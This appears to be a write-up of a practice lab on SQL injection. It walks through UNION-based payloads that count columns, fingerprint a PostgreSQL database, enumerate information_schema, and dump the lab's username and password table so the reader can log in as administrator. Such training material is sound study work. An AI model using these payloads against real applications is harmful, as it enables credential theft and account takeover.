## SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Notes

- `/login`
- `/filter?category=parameter`

## Resume

1. Find the number of columns
2. Find a reflected column
3. Enumerate database tables
4. Enumerate table columns
5. Dump users credentials
6. Login as administrator

## Solve

First, determine the number of columns returned by the query.

Trying with one column :

```
' UNION ALL SELECT NULL-- -
```

returns :

```
Internal Server Error
```

Retrying with 2 columns :

```
' UNION ALL SELECT NULL,NULL-- -
```

works correctly, confirming that the query contains **2 columns**.

Next, confirm the database type using :

```
' UNION ALL SELECT version(),NULL-- -
```

which returns :

```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

Now enumerate database tables :

```
' UNION ALL SELECT table_name,NULL FROM information_schema.tables-- -
```

This reveals a table named :

```
users
```

The next step is to enumerate the columns from this table :

```
' UNION ALL SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

Returned columns :

- `username`
- `password`
- `email`

Finally, dump usernames and passwords :

```
' UNION ALL SELECT username,password FROM users-- -
```

Returned credentials :

```
administrator : cvxgq1iob06qko8gir0x
wiener        : onekalqan8fjjlj38hll
carlos        : u1xor6gd25zn1jaexl4f
```

Login using the administrator credentials to solve the lab.